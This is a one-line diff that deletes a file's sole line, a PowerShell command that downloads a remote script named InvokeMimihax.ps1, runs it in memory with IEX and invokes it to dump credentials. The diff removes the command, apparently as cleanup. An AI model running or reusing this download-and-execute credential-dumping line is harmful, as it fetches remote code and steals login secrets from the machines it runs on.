@@ -1,1 +1,0 @@
-IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/integhax/utilities/master/InvokeMimihax.ps1'); Invoke-Mimihax -DumpCreds
